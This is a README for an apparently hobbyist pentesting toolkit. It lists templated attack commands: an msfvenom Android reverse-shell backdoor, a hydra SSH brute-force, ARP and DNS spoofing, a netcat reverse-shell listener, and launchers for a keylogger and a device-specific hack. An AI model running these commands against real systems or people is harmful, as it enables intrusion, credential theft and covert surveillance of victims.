# Rayishper Pentesting Toolkit

Rayishper is a customizable and automated toolkit designed for cybersecurity enthusiasts and professionals. Originally inspired by manual note-taking on cybersecurity tasks, Rayishper automates a variety of common pentesting activities to streamline your workflow.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Dependencies](#dependencies)
- [Usage](#usage)
- [Commands Overview](#commands-overview)
- [License](#license)

## Introduction

Rayishper started as a simple note-taking practice to assist with various cybersecurity tasks. It has now evolved into an automated toolkit that can perform a wide range of pentesting activities such as password cracking, network sniffing, social engineering, and more.

## Features

- **Password Cracking:** Automate brute-force attacks using tools like John the Ripper and aircrack-ng.
- **Network Attacks:** Perform ARP spoofing, DNS spoofing, port scanning, and packet sniffing.
- **Payload Generation:** Create custom payloads for Android devices using Metasploit.
- **Social Engineering:** Launch social engineering attacks using the SET toolkit.
- **File and Directory Management:** Automate common file and directory operations like viewing, deleting, and scanning.
- **Script Automation:** Convert repetitive manual tasks into automated scripts.

## Installation

Clone the Rayishper repository:

```bash
git clone https://github.com/your-repo/rayishper.git
```

```bash
cd rayishper
```

## Make the script executable:
```bash
chmod +x rayishper.py
```

## Install the required dependencies:
```bash
sudo apt-get update
```
```bash
sudo apt-get install python3 python3-pip metasploit-framework nmap hydra tcpdump aircrack-ng john setoolkit
```
**Ensure that all tools used in the script are correctly installed and accessible in your PATH.**

## Dependencies: 
The Rayishper script relies on the following tools and libraries:

- **Python-3:** The core programming language used in the script.
- **Metasploit Framework:** For payload generation, reverse shell listeners, and exploitation.
- **nmap:** For network scanning and discovery.
- **Hydra:** For brute-forcing SSH logins.
- **Tcpdump:** For packet sniffing and network analysis.
- **Aircrack ng:** For wireless network cracking.
- **John the Ripper:** For password cracking.
- **Social Engineering Toolkit (SET):** For social engineering attacks.

## Usage
## To run Rayishper:
```bash 
./rayishper.py 
 ```

## Main Menu
When you start the script, you'll be prompted with the following options:

Hello Neo, what's the magic word?: Type "red pill" to access the main menu.
Main Menu Options: Choose from various pentesting actions such as deploying keyloggers, scanning networks, or generating payloads.
Commands Overview
Below is a summary of the main commands used within Rayishper:

## VF685 Hack
Description: Automate hacking a specific VF685 target.

Command: 
```bash 
python3 VF685.py
```

## Keylogger Deployment
Description: Start a keylogger that logs keystrokes to a file.

Command:
```bash 
 python3 keylog.py
```

## Payload Creation
Description: Generate a custom Android payload using Metasploit.

Command: 
```bash 
msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {location}/{Backdoor_name}
```

## SSH Brute-Force
Description: Perform a brute-force attack on SSH login.

Command: 
```bash
hydra -l {username} -P {wordlist} ssh://{target_ip}
```

## Network Scanning
Description: Scan a target IP for open ports and services.

Command: 
```bash
nmap -sV {target_ip}
```

## ARP Spoofing
Description: Perform ARP spoofing to intercept traffic.

Command: 
```bash
sudo arpspoof -i eth0 -t {target_ip} -r {gateway_ip}
```

## Reverse Shell Listener
Description: Start a netcat listener for reverse shells.

Command: 
```bash
nc -lvnp {lport}
```

## DNS Spoofing
Description: Spoof DNS responses on a network.

Command: 
```bash
sudo dnsspoof
```

## License
This project is open-source and available under the [MIT License.](https://opensource.org/license/mit)
